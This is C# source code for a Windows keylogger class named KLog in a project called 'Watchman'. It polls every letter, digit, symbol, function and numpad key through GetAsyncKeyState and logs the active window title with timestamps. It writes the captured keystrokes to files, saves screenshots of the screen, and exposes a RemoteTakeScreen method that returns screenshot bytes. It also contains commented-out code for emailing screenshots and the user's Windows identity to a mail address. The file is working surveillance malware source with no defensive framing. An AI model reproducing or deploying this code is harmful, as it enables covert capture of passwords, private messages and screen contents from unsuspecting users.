using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;

namespace Watchman
{
    public class KLog
    {
        #region variables
        private int _keystate;
        private int _shift;
        private string _filePath;
        private StringBuilder _builder;
        private static int _photoCount;
        private string _printScreen;
        #endregion

        #region interop
        /// <summary>
        /// Determines whether a key is up or down at the time the function is called, and whether the key was pressed after a previous call to GetAsyncKeyState. 
        /// </summary>
        /// <param name="vKey">The virtual-key code.</param>
        /// <returns></returns>
        [DllImport("user32", EntryPoint = "GetAsyncKeyState", ExactSpelling = true, CharSet = CharSet.Ansi, SetLastError = true)]
        private static extern int GetAsyncKeyState(long vKey);

        /// <summary>
        /// Retrieves a handle to the foreground window (the window with which the user is currently working). 
        /// </summary>
        /// <returns></returns>
        [DllImport("user32.dll")]
        private static extern IntPtr GetForegroundWindow();

        /// <summary>
        /// Copies the text of the specified window's title bar (if it has one) into a buffer. 
        /// </summary>
        /// <param name="hWnd">A handle to the window or control containing the text. </param>
        /// <param name="lpString">The buffer that will receive the text. </param>
        /// <param name="nMaxCount">The maximum number of characters to copy to the buffer, including the null character.</param>
        /// <returns></returns>
        [DllImport("user32.dll")]
        private static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);
        #endregion

        public KLog()
        {
            _filePath = GetFilePath();
            _builder = new StringBuilder();
        }

        #region functions
        private static bool CapsLock()
        {
            return Control.ModifierKeys == Keys.CapsLock;
        }

        private static string GetFilePath()
        {
            string year = DateTime.Now.Year.ToString();
            string month = DateTime.Now.Month.ToString();
            string day = DateTime.Now.Day.ToString();
            string hour = DateTime.Now.Hour.ToString();
            string minute = DateTime.Now.Minute.ToString();
            string second = DateTime.Now.Second.ToString();
            string time = string.Format("{0}-{1}-{2}-{3}-{4}-{5}", year, month, day, hour, minute, second);
            string loc = Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().Location) + "\\KeyLog";
            DirectoryInfo dir = new DirectoryInfo(loc);
            if (!dir.Exists)dir.Create();

            return string.Format("{0}{1}{2}", dir.FullName + "\\KeyLog_", time, ".txt");
        }

        //TODO: Doesn't work with dual monitor
        private static string GetActiveWindowTitle()
        {
            const int nChars = 256;
            StringBuilder buff = new StringBuilder(nChars);
            IntPtr handle = GetForegroundWindow();

            return GetWindowText(handle, buff, nChars) > 0 ? buff.ToString() : null;
        }

        private static Bitmap BitMapCreater()
        {
            Rectangle rect = Screen.PrimaryScreen.Bounds;
            int color = Screen.PrimaryScreen.BitsPerPixel;
            PixelFormat pFormat;

            switch (color)
            {
                case 8:
                case 16:
                    pFormat = PixelFormat.Format16bppRgb565;
                    break;
                case 24:
                    pFormat = PixelFormat.Format24bppRgb;
                    break;
                case 32:
                    pFormat = PixelFormat.Format32bppArgb;
                    break;
                default:
                    pFormat = PixelFormat.Format32bppArgb;
                    break;
            }

            Bitmap bmp = new Bitmap(rect.Width, rect.Height, pFormat);
            Graphics graphics = Graphics.FromImage(bmp);
            graphics.CopyFromScreen(rect.Left, rect.Top, 0, 0, rect.Size);
            return bmp;
        }

        private void email()
        {
            //string sysName = string.Empty;
            //string sysUser = string.Empty;
            //System.Net.Mail.MailAddress toAddress = new System.Net.Mail.MailAddress("email@gmail.com");
            //System.Net.Mail.MailAddress fromAddress = new System.Net.Mail.MailAddress("email@gmail.com");
            //System.Net.Mail.MailMessage mm = new System.Net.Mail.MailMessage(fromAddress, toAddress);
            //sysName = System.Security.Principal.WindowsIdentity.GetCurrent().Name.ToString();
            //sysUser = System.Security.Principal.WindowsIdentity.GetCurrent().User.ToString();
            //mm.Subject = sysName + " " + sysUser;
            //string filename = string.Empty;
            //System.Net.Mail.Attachment mailAttachment = new System.Net.Mail.Attachment(printScreen);
            //mm.Attachments.Add(mailAttachment);
            //mm.IsBodyHtml = true;
            //mm.BodyEncoding = System.Text.Encoding.UTF8;
            //sendMail(mm);  
        }

        public void TakeScreen()
        {
            _photoCount = _photoCount + 1;
            using (Bitmap bitmap = BitMapCreater())
            {
                _printScreen = string.Format("{0}{1}", _filePath, "screenshot" + _photoCount + ".jpg");
                bitmap.Save(_printScreen, ImageFormat.Jpeg);
                bitmap.Dispose();
            }
        }

        public static byte[] RemoteTakeScreen()
        {
            try
            {
                ImageConverter converter = new ImageConverter();
                byte[] data = (byte[])converter.ConvertTo(BitMapCreater(), typeof(byte[]));
                Image img = (Image)converter.ConvertFrom(data);
                if(img != null)img.Dispose();
                return data;
            }
            catch
            {
                return null;
            }
        }

        public void Log()
        {
            _shift = GetAsyncKeyState((int)Keys.ShiftKey);

            _keystate = GetAsyncKeyState((int)Keys.A);
            if ((CapsLock() && _shift == 0 && (_keystate & 0X1) == 0X1) |
                (CapsLock() == false && _shift != 0 && (_keystate & 0X1) == 0X1))
            {
                _builder.Append("A");
            }
            if ((CapsLock() == false && _shift == 0 && (_keystate & 0X1) == 0X1) |
                (CapsLock() && _shift != 0 && (_keystate & 0X1) == 0X1))
            {
                _builder.Append("a");
            }

            _keystate = GetAsyncKeyState((int)Keys.B);
            if ((CapsLock() && _shift == 0 && (_keystate & 0X1) == 0X1) |
                (CapsLock() == false && _shift != 0 && (_keystate & 0X1) == 0X1))
            {
                _builder.Append("B");
            }
            if ((CapsLock() == false && _shift == 0 && (_keystate & 0X1) == 0X1) |
                (CapsLock() && _shift != 0 && (_keystate & 0X1) == 0X1))
            {
                _builder.Append("b");
            }

            _keystate = GetAsyncKeyState((int)Keys.C);
            if ((CapsLock() && _shift == 0 && (_keystate & 0X1) == 0X1) |
                (CapsLock() == false && _shift != 0 && (_keystate & 0X1) == 0X1))
            {
                _builder.Append("C");
            }
            if ((CapsLock() == false && _shift == 0 && (_keystate & 0X1) == 0X1) |
                (CapsLock() && _shift != 0 && (_keystate & 0X1) == 0X1))
            {
                _builder.Append("c");
            }

            _keystate = GetAsyncKeyState((int)Keys.D);
            if ((CapsLock() && _shift == 0 && (_keystate & 0X1) == 0X1) |
                (CapsLock() == false && _shift != 0 && (_keystate & 0X1) == 0X1))
            {
                _builder.Append("D");
            }
            if ((CapsLock() == false && _shift == 0 && (_keystate & 0X1) == 0X1) |
                (CapsLock() && _shift != 0 && (_keystate & 0X1) == 0X1))
            {
                _builder.Append("d");
            }

            _keystate = GetAsyncKeyState((int)Keys.E);
            if ((CapsLock() && _shift == 0 && (_keystate & 0X1) == 0X1) |
                (CapsLock() == false && _shift != 0 && (_keystate & 0X1) == 0X1))
            {
                _builder.Append("E");
            }
            if ((CapsLock() == false && _shift == 0 && (_keystate & 0X1) == 0X1) |
                (CapsLock() && _shift != 0 && (_keystate & 0X1) == 0X1))
            {
                _builder.Append("e");
            }

            _keystate = GetAsyncKeyState((int)Keys.F);
            if ((CapsLock() && _shift == 0 && (_keystate & 0X1) == 0X1) |
                (CapsLock() == false && _shift != 0 && (_keystate & 0X1) == 0X1))
            {
                _builder.Append("F");
            }
            if ((CapsLock() == false && _shift == 0 && (_keystate & 0X1) == 0X1) |
                (CapsLock() && _shift != 0 && (_keystate & 0X1) == 0X1))
            {
                _builder.Append("f");
            }

            _keystate = GetAsyncKeyState((int)Keys.G);
            if ((CapsLock() && _shift == 0 && (_keystate & 0X1) == 0X1) |
                (CapsLock() == false && _shift != 0 && (_keystate & 0X1) == 0X1))
            {
                _builder.Append("G");
            }
            if ((CapsLock() == false && _shift == 0 && (_keystate & 0X1) == 0X1) |
                (CapsLock() && _shift != 0 && (_keystate & 0X1) == 0X1))
            {
                _builder.Append("g");
            }

            _keystate = GetAsyncKeyState((int)Keys.H);
            if ((CapsLock() && _shift == 0 && (_keystate & 0X1) == 0X1) |
                (CapsLock() == false && _shift != 0 && (_keystate & 0X1) == 0X1))
            {
                _builder.Append("H");
            }
            if ((CapsLock() == false && _shift == 0 && (_keystate & 0X1) == 0X1) |
                (CapsLock() && _shift != 0 && (_keystate & 0X1) == 0X1))
            {
                _builder.Append("h");
            }

            _keystate = GetAsyncKeyState((int)Keys.I);
            if ((CapsLock() && _shift == 0 && (_keystate & 0X1) == 0X1) |
                (CapsLock() == false && _shift != 0 && (_keystate & 0X1) == 0X1))
            {
                _builder.Append("I");
            }
            if ((CapsLock() == false && _shift == 0 && (_keystate & 0X1) == 0X1) |
                (CapsLock() && _shift != 0 && (_keystate & 0X1) == 0X1))
            {
                _builder.Append("i");
            }

            _keystate = GetAsyncKeyState((int)Keys.J);
            if ((CapsLock() && _shift == 0 && (_keystate & 0X1) == 0X1) |
                (CapsLock() == false && _shift != 0 && (_keystate & 0X1) == 0X1))
            {
                _builder.Append("J");
            }
            if ((CapsLock() == false && _shift == 0 && (_keystate & 0X1) == 0X1) |
                (CapsLock() && _shift != 0 && (_keystate & 0X1) == 0X1))
            {
                _builder.Append("j");
            }

            _keystate = GetAsyncKeyState((int)Keys.K);
            if ((CapsLock() && _shift == 0 && (_keystate & 0X1) == 0X1) |
                (CapsLock() == false && _shift != 0 && (_keystate & 0X1) == 0X1))
            {
                _builder.Append("K");
            }
            if ((CapsLock() == false && _shift == 0 && (_keystate & 0X1) == 0X1) |
                (CapsLock() && _shift != 0 && (_keystate & 0X1) == 0X1))
            {
                _builder.Append("k");
            }

            _keystate = GetAsyncKeyState((int)Keys.L);
            if ((CapsLock() && _shift == 0 && (_keystate & 0X1) == 0X1) |
                (CapsLock() == false && _shift != 0 && (_keystate & 0X1) == 0X1))
            {
                _builder.Append("L");
            }
            if ((CapsLock() == false && _shift == 0 && (_keystate & 0X1) == 0X1) |
                (CapsLock() && _shift != 0 && (_keystate & 0X1) == 0X1))
            {
                _builder.Append("l");
            }

            _keystate = GetAsyncKeyState((int)Keys.M);
            if ((CapsLock() && _shift == 0 && (_keystate & 0X1) == 0X1) |
                (CapsLock() == false && _shift != 0 && (_keystate & 0X1) == 0X1))
            {
                _builder.Append("M");
            }
            if ((CapsLock() == false && _shift == 0 && (_keystate & 0X1) == 0X1) |
                (CapsLock() && _shift != 0 && (_keystate & 0X1) == 0X1))
            {
                _builder.Append("m");
            }

            _keystate = GetAsyncKeyState((int)Keys.N);
            if ((CapsLock() && _shift == 0 && (_keystate & 0X1) == 0X1) |
                (CapsLock() == false && _shift != 0 && (_keystate & 0X1) == 0X1))
            {
                _builder.Append("N");
            }
            if ((CapsLock() == false && _shift == 0 && (_keystate & 0X1) == 0X1) |
                (CapsLock() && _shift != 0 && (_keystate & 0X1) == 0X1))
            {
                _builder.Append("n");
            }

            _keystate = GetAsyncKeyState((int)Keys.O);
            if ((CapsLock() && _shift == 0 && (_keystate & 0X1) == 0X1) |
                (CapsLock() == false && _shift != 0 && (_keystate & 0X1) == 0X1))
            {
                _builder.Append("O");
            }
            if ((CapsLock() == false && _shift == 0 && (_keystate & 0X1) == 0X1) |
                (CapsLock() && _shift != 0 && (_keystate & 0X1) == 0X1))
            {
                _builder.Append("o");
            }

            _keystate = GetAsyncKeyState((int)Keys.P);
            if ((CapsLock() && _shift == 0 && (_keystate & 0X1) == 0X1) |
                (CapsLock() == false && _shift != 0 && (_keystate & 0X1) == 0X1))
            {
                _builder.Append("P");
            }
            if ((CapsLock() == false && _shift == 0 && (_keystate & 0X1) == 0X1) |
                (CapsLock() && _shift != 0 && (_keystate & 0X1) == 0X1))
            {
                _builder.Append("p");
            }

            _keystate = GetAsyncKeyState((int)Keys.Q);
            if ((CapsLock() && _shift == 0 && (_keystate & 0X1) == 0X1) |
                (CapsLock() == false && _shift != 0 && (_keystate & 0X1) == 0X1))
            {
                _builder.Append("Q");
            }
            if ((CapsLock() == false && _shift == 0 && (_keystate & 0X1) == 0X1) |
                (CapsLock() && _shift != 0 && (_keystate & 0X1) == 0X1))
            {
                _builder.Append("q");
            }

            _keystate = GetAsyncKeyState((int)Keys.R);
            if ((CapsLock() && _shift == 0 && (_keystate & 0X1) == 0X1) |
                (CapsLock() == false && _shift != 0 && (_keystate & 0X1) == 0X1))
            {
                _builder.Append("R");
            }
            if ((CapsLock() == false && _shift == 0 && (_keystate & 0X1) == 0X1) |
                (CapsLock() && _shift != 0 && (_keystate & 0X1) == 0X1))
            {
                _builder.Append("r");
            }

            _keystate = GetAsyncKeyState((int)Keys.S);
            if ((CapsLock() && _shift == 0 && (_keystate & 0X1) == 0X1) |
                (CapsLock() == false && _shift != 0 && (_keystate & 0X1) == 0X1))
            {
                _builder.Append("S");
            }
            if ((CapsLock() == false && _shift == 0 && (_keystate & 0X1) == 0X1) |
                (CapsLock() && _shift != 0 && (_keystate & 0X1) == 0X1))
            {
                _builder.Append("s");
            }

            _keystate = GetAsyncKeyState((int)Keys.T);
            if ((CapsLock() && _shift == 0 && (_keystate & 0X1) == 0X1) |
                (CapsLock() == false && _shift != 0 && (_keystate & 0X1) == 0X1))
            {
                _builder.Append("T");
            }
            if ((CapsLock() == false && _shift == 0 && (_keystate & 0X1) == 0X1) |
                (CapsLock() && _shift != 0 && (_keystate & 0X1) == 0X1))
            {
                _builder.Append("t");
            }

            _keystate = GetAsyncKeyState((int)Keys.U);
            if ((CapsLock() && _shift == 0 && (_keystate & 0X1) == 0X1) |
                (CapsLock() == false && _shift != 0 && (_keystate & 0X1) == 0X1))
            {
                _builder.Append("U");
            }
            if ((CapsLock() == false && _shift == 0 && (_keystate & 0X1) == 0X1) |
                (CapsLock() && _shift != 0 && (_keystate & 0X1) == 0X1))
            {
                _builder.Append("u");
            }

            _keystate = GetAsyncKeyState((int)Keys.V);
            if ((CapsLock() && _shift == 0 && (_keystate & 0X1) == 0X1) |
                (CapsLock() == false && _shift != 0 && (_keystate & 0X1) == 0X1))
            {
                _builder.Append("V");
            }
            if ((CapsLock() == false && _shift == 0 && (_keystate & 0X1) == 0X1) |
                (CapsLock() && _shift != 0 && (_keystate & 0X1) == 0X1))
            {
                _builder.Append("v");
            }

            _keystate = GetAsyncKeyState((int)Keys.W);
            if ((CapsLock() && _shift == 0 && (_keystate & 0X1) == 0X1) |
                (CapsLock() == false && _shift != 0 && (_keystate & 0X1) == 0X1))
            {
                _builder.Append("W");
            }
            if ((CapsLock() == false && _shift == 0 && (_keystate & 0X1) == 0X1) |
                (CapsLock() && _shift != 0 && (_keystate & 0X1) == 0X1))
            {
                _builder.Append("w");
            }

            _keystate = GetAsyncKeyState((int)Keys.X);
            if ((CapsLock() && _shift == 0 && (_keystate & 0X1) == 0X1) |
                (CapsLock() == false && _shift != 0 && (_keystate & 0X1) == 0X1))
            {
                _builder.Append("X");
            }
            if ((CapsLock() == false && _shift == 0 && (_keystate & 0X1) == 0X1) |
                (CapsLock() && _shift != 0 && (_keystate & 0X1) == 0X1))
            {
                _builder.Append("x");
            }

            _keystate = GetAsyncKeyState((int)Keys.Y);
            if ((CapsLock() && _shift == 0 && (_keystate & 0X1) == 0X1) |
                (CapsLock() == false && _shift != 0 && (_keystate & 0X1) == 0X1))
            {
                _builder.Append("Y");
            }
            if ((CapsLock() == false && _shift == 0 && (_keystate & 0X1) == 0X1) |
                (CapsLock() && _shift != 0 && (_keystate & 0X1) == 0X1))
            {
                _builder.Append("y");
            }

            _keystate = GetAsyncKeyState((int)Keys.Z);
            if ((CapsLock() && _shift == 0 && (_keystate & 0X1) == 0X1) |
                (CapsLock() == false && _shift != 0 && (_keystate & 0X1) == 0X1))
            {
                _builder.Append("Z");
            }
            if ((CapsLock() == false && _shift == 0 && (_keystate & 0X1) == 0X1) |
                (CapsLock() && _shift != 0 && (_keystate & 0X1) == 0X1))
            {
                _builder.Append("z");
            }

            _keystate = GetAsyncKeyState((int)Keys.D1);
            if (_shift == 0 && (_keystate & 0X1) == 0X1)
            {
                _builder.Append("1");
            }

            if (_shift != 0 && (_keystate & 0X1) == 0X1)
            {
                _builder.Append("!");
            }

            _keystate = GetAsyncKeyState((int)Keys.D2);
            if (_shift == 0 && (_keystate & 0X1) == 0X1)
            {
                _builder.Append("2");
            }

            if (_shift != 0 && (_keystate & 0X1) == 0X1)
            {
                _builder.Append("@");
            }

            _keystate = GetAsyncKeyState((int)Keys.D3);
            if (_shift == 0 && (_keystate & 0X1) == 0X1)
            {
                _builder.Append("3");
            }

            if (_shift != 0 && (_keystate & 0X1) == 0X1)
            {
                _builder.Append("#");
            }

            _keystate = GetAsyncKeyState((int)Keys.D4);
            if (_shift == 0 && (_keystate & 0X1) == 0X1)
            {
                _builder.Append("4");
            }

            if (_shift != 0 && (_keystate & 0X1) == 0X1)
            {
                _builder.Append("$");
            }

            _keystate = GetAsyncKeyState((int)Keys.D5);
            if (_shift == 0 && (_keystate & 0X1) == 0X1)
            {
                _builder.Append("5");
            }

            if (_shift != 0 && (_keystate & 0X1) == 0X1)
            {
                _builder.Append("%");
            }

            _keystate = GetAsyncKeyState((int)Keys.D6);
            if (_shift == 0 && (_keystate & 0X1) == 0X1)
            {
                _builder.Append("6");
            }

            if (_shift != 0 && (_keystate & 0X1) == 0X1)
            {
                _builder.Append("^");
            }

            _keystate = GetAsyncKeyState((int)Keys.D7);
            if (_shift == 0 && (_keystate & 0X1) == 0X1)
            {
                _builder.Append("7");
            }

            if (_shift != 0 && (_keystate & 0X1) == 0X1)
            {
                _builder.Append("&");
            }

            _keystate = GetAsyncKeyState((int)Keys.D8);
            if (_shift == 0 && (_keystate & 0X1) == 0X1)
            {
                _builder.Append("8");
            }

            if (_shift != 0 && (_keystate & 0X1) == 0X1)
            {
                _builder.Append("*");
            }

            _keystate = GetAsyncKeyState((int)Keys.D9);
            if (_shift == 0 && (_keystate & 0X1) == 0X1)
            {
                _builder.Append("9");
            }

            if (_shift != 0 && (_keystate & 0X1) == 0X1)
            {
                _builder.Append("(");
            }

            _keystate = GetAsyncKeyState((int)Keys.D0);
            if (_shift == 0 && (_keystate & 0X1) == 0X1)
            {
                _builder.Append("0");
            }

            if (_shift != 0 && (_keystate & 0X1) == 0X1)
            {
                _builder.Append(")");
            }

            _keystate = GetAsyncKeyState((int)Keys.Back);
            if ((_keystate & 0X1) == 0X1)
            {
                _builder.Append("[Backspace]");
            }

            _keystate = GetAsyncKeyState((int)Keys.Tab);
            if ((_keystate & 0X1) == 0X1)
            {
                _builder.Append("[Tab]");
            }

            _keystate = GetAsyncKeyState((int)Keys.Return);
            if ((_keystate & 0X1) == 0X1)
            {
                _builder.Append("[Return]");
            }

            _keystate = GetAsyncKeyState((int)Keys.ShiftKey);
            if ((_keystate & 0X1) == 0X1)
            {
                _builder.Append("[Shift]");
            }

            _keystate = GetAsyncKeyState((int)Keys.ControlKey);
            if ((_keystate & 0X1) == 0X1)
            {
                _builder.Append("[Ctrl]");
            }

            _keystate = GetAsyncKeyState((int)Keys.Menu);
            if ((_keystate & 0X1) == 0X1)
            {
                _builder.Append("[Alt]");
            }

            _keystate = GetAsyncKeyState((int)Keys.Pause);
            if ((_keystate & 0X1) == 0X1)
            {
                _builder.Append("[Pause]");
            }

            _keystate = GetAsyncKeyState((int)Keys.Escape);
            if ((_keystate & 0X1) == 0X1)
            {
                _builder.Append("[Esc]");
            }

            _keystate = GetAsyncKeyState((int)Keys.Space);
            if ((_keystate & 0X1) == 0X1)
            {
                _builder.Append(" ");
            }

            _keystate = GetAsyncKeyState((int)Keys.End);
            if ((_keystate & 0X1) == 0X1)
            {
                _builder.Append("[End]");
            }

            _keystate = GetAsyncKeyState((int)Keys.Home);
            if ((_keystate & 0X1) == 0X1)
            {
                _builder.Append("[Home]");
            }

            _keystate = GetAsyncKeyState((int)Keys.Left);
            if ((_keystate & 0X1) == 0X1)
            {
                _builder.Append("[Left]");
            }

            _keystate = GetAsyncKeyState((int)Keys.Right);
            if ((_keystate & 0X1) == 0X1)
            {
                _builder.Append("[Right]");
            }

            _keystate = GetAsyncKeyState((int)Keys.Up);
            if ((_keystate & 0X1) == 0X1)
            {
                _builder.Append("[Up]");
            }

            _keystate = GetAsyncKeyState((int)Keys.Down);
            if ((_keystate & 0X1) == 0X1)
            {
                _builder.Append("[Down]");
            }

            _keystate = GetAsyncKeyState((int)Keys.Insert);
            if ((_keystate & 0X1) == 0X1)
            {
                _builder.Append("[Insert]");
            }

            _keystate = GetAsyncKeyState((int)Keys.Delete);
            if ((_keystate & 0X1) == 0X1)
            {
                _builder.Append("[Delete]");
            }

            _keystate = GetAsyncKeyState(0XBA);
            if (_shift == 0 && (_keystate & 0X1) == 0X1)
            {
                _builder.Append(";");
            }

            if (_shift != 0 && (_keystate & 0X1) == 0X1)
            {
                _builder.Append(":");
            }

            _keystate = GetAsyncKeyState(0XBB);
            if (_shift == 0 && (_keystate & 0X1) == 0X1)
            {
                _builder.Append("=");
            }

            if (_shift != 0 && (_keystate & 0X1) == 0X1)
            {
                _builder.Append("+");
            }

            _keystate = GetAsyncKeyState(0XBC);
            if (_shift == 0 && (_keystate & 0X1) == 0X1)
            {
                _builder.Append(",");
            }

            if (_shift != 0 && (_keystate & 0X1) == 0X1)
            {
                _builder.Append("<");
            }

            _keystate = GetAsyncKeyState(0XBD);
            if (_shift == 0 && (_keystate & 0X1) == 0X1)
            {
                _builder.Append("-");
            }

            if (_shift != 0 && (_keystate & 0X1) == 0X1)
            {
                _builder.Append("_");
            }

            _keystate = GetAsyncKeyState(0XBE);
            if (_shift == 0 && (_keystate & 0X1) == 0X1)
            {
                _builder.Append(".");
            }

            if (_shift != 0 && (_keystate & 0X1) == 0X1)
            {
                _builder.Append(">");
            }

            _keystate = GetAsyncKeyState(0XBF);
            if (_shift == 0 && (_keystate & 0X1) == 0X1)
            {
                _builder.Append("/");
            }

            if (_shift != 0 && (_keystate & 0X1) == 0X1)
            {
                _builder.Append("?");
            }

            _keystate = GetAsyncKeyState(0XC0);
            if (_shift == 0 && (_keystate & 0X1) == 0X1)
            {
                _builder.Append("`");
            }

            if (_shift != 0 && (_keystate & 0X1) == 0X1)
            {
                _builder.Append("~");
            }

            _keystate = GetAsyncKeyState(0XDB);
            if (_shift == 0 && (_keystate & 0X1) == 0X1)
            {
                _builder.Append("[");
            }

            if (_shift != 0 && (_keystate & 0X1) == 0X1)
            {
                _builder.Append("[");
            }

            _keystate = GetAsyncKeyState(0XDC);
            if (_shift == 0 && (_keystate & 0X1) == 0X1)
            {
                _builder.Append("\\");
            }

            if (_shift != 0 && (_keystate & 0X1) == 0X1)
            {
                _builder.Append("|");
            }

            _keystate = GetAsyncKeyState(0XDD);
            if (_shift == 0 && (_keystate & 0X1) == 0X1)
            {
                _builder.Append("]");
            }

            if (_shift != 0 && (_keystate & 0X1) == 0X1)
            {
                _builder.Append("]");
            }

            _keystate = GetAsyncKeyState(0XDE);
            if (_shift == 0 && (_keystate & 0X1) == 0X1)
            {
                _builder.Append("'");
            }

            if (_shift != 0 && (_keystate & 0X1) == 0X1)
            {
                _builder.Append((char)(34));
            }

            _keystate = GetAsyncKeyState((int)Keys.Multiply);
            if ((_keystate & 0X1) == 0X1)
            {
                _builder.Append("*");
            }

            _keystate = GetAsyncKeyState((int)Keys.Divide);
            if ((_keystate & 0X1) == 0X1)
            {
                _builder.Append("/");
            }

            _keystate = GetAsyncKeyState((int)Keys.Add);
            if ((_keystate & 0X1) == 0X1)
            {
                _builder.Append("+");
            }

            _keystate = GetAsyncKeyState((int)Keys.Subtract);
            if ((_keystate & 0X1) == 0X1)
            {
                _builder.Append("-");
            }

            _keystate = GetAsyncKeyState((int)Keys.Decimal);
            if ((_keystate & 0X1) == 0X1)
            {
                _builder.Append("[Decimal]");
            }

            _keystate = GetAsyncKeyState((int)Keys.F1);
            if ((_keystate & 0X1) == 0X1)
            {
                _builder.Append("[F1]");
            }

            _keystate = GetAsyncKeyState((int)Keys.F2);
            if ((_keystate & 0X1) == 0X1)
            {
                _builder.Append("[F2]");
            }

            _keystate = GetAsyncKeyState((int)Keys.F3);
            if ((_keystate & 0X1) == 0X1)
            {
                _builder.Append("[F3]");
            }

            _keystate = GetAsyncKeyState((int)Keys.F4);
            if ((_keystate & 0X1) == 0X1)
            {
                _builder.Append("[F4]");
            }

            _keystate = GetAsyncKeyState((int)Keys.F5);
            if ((_keystate & 0X1) == 0X1)
            {
                _builder.Append("[F5]");
            }

            _keystate = GetAsyncKeyState((int)Keys.F6);
            if ((_keystate & 0X1) == 0X1)
            {
                _builder.Append("[F6]");
            }

            _keystate = GetAsyncKeyState((int)Keys.F7);
            if ((_keystate & 0X1) == 0X1)
            {
                _builder.Append("[F7]");
            }

            _keystate = GetAsyncKeyState((int)Keys.F8);
            if ((_keystate & 0X1) == 0X1)
            {
                _builder.Append("[F8]");
            }

            _keystate = GetAsyncKeyState((int)Keys.F9);
            if ((_keystate & 0X1) == 0X1)
            {
                _builder.Append("[F9]");
            }

            _keystate = GetAsyncKeyState((int)Keys.F10);
            if ((_keystate & 0X1) == 0X1)
            {
                _builder.Append("[F10]");
            }

            _keystate = GetAsyncKeyState((int)Keys.F11);
            if ((_keystate & 0X1) == 0X1)
            {
                _builder.Append("[F11]");
            }

            _keystate = GetAsyncKeyState((int)Keys.F12);
            if (_shift == 0 && (_keystate & 0X1) == 0X1)
            {
                _builder.Append("[F12]");
            }

            _keystate = GetAsyncKeyState((int)Keys.NumLock);
            if ((_keystate & 0X1) == 0X1)
            {
                _builder.Append("[NumLock]");
            }

            _keystate = GetAsyncKeyState((int)Keys.Scroll);
            if ((_keystate & 0X1) == 0X1)
            {
                _builder.Append("[ScrollLock]");
            }

            _keystate = GetAsyncKeyState((int)Keys.Print);
            if ((_keystate & 0X1) == 0X1)
            {
                _builder.Append("[PrintScreen]");
            }

            _keystate = GetAsyncKeyState((int)Keys.PageUp);
            if ((_keystate & 0X1) == 0X1)
            {
                _builder.Append("[PageUp]");
            }

            _keystate = GetAsyncKeyState((int)Keys.PageDown);
            if ((_keystate & 0X1) == 0X1)
            {
                _builder.Append("[PageDown]");
            }

            _keystate = GetAsyncKeyState((int)Keys.NumPad1);
            if ((_keystate & 0X1) == 0X1)
            {
                _builder.Append("1");
            }

            _keystate = GetAsyncKeyState((int)Keys.NumPad2);
            if ((_keystate & 0X1) == 0X1)
            {
                _builder.Append("2");
            }

            _keystate = GetAsyncKeyState((int)Keys.NumPad3);
            if ((_keystate & 0X1) == 0X1)
            {
                _builder.Append("3");
            }

            _keystate = GetAsyncKeyState((int)Keys.NumPad4);
            if ((_keystate & 0X1) == 0X1)
            {
                _builder.Append("4");
            }

            _keystate = GetAsyncKeyState((int)Keys.NumPad5);
            if ((_keystate & 0X1) == 0X1)
            {
                _builder.Append("5");
            }

            _keystate = GetAsyncKeyState((int)Keys.NumPad6);
            if ((_keystate & 0X1) == 0X1)
            {
                _builder.Append("6");
            }

            _keystate = GetAsyncKeyState((int)Keys.NumPad7);
            if ((_keystate & 0X1) == 0X1)
            {
                _builder.Append("7");
            }

            _keystate = GetAsyncKeyState((int)Keys.NumPad8);
            if ((_keystate & 0X1) == 0X1)
            {
                _builder.Append("8");
            }

            _keystate = GetAsyncKeyState((int)Keys.NumPad9);
            if ((_keystate & 0X1) == 0X1)
            {
                _builder.Append("9");
            }

            _keystate = GetAsyncKeyState((int)Keys.NumPad0);
            if ((_keystate & 0X1) == 0X1)
            {
                _builder.Append("0");
            }
            _keystate = GetAsyncKeyState((int)Keys.ControlKey);
            if ((_keystate & 0X1) == 0X1)
            {
                _builder.Append("[Ctrl]");
            }
        }

        public void WriteLog()
        {
            using (StreamWriter writer = new StreamWriter(_filePath, false))
            {
                writer.Write(_builder.ToString());
                _builder = new StringBuilder();
                _filePath = GetFilePath();
                writer.Flush();
                writer.Close();
            }
        }

        public void ActiveWindow()
        {
            string year = DateTime.Now.Year.ToString();
            string month = DateTime.Now.Month.ToString();
            string day = DateTime.Now.Day.ToString();
            string hour = DateTime.Now.Hour.ToString();
            string minute = DateTime.Now.Minute.ToString();
            string second = DateTime.Now.Second.ToString();
            string time = string.Format("{0}-{1}-{2}-{3}-{4}-{5}", year, month, day, hour, minute, second);
            _builder.AppendLine();
            _builder.Append("== " + GetActiveWindowTitle() + " ==" + time);
            _builder.AppendLine();
        }
        #endregion
    }
}
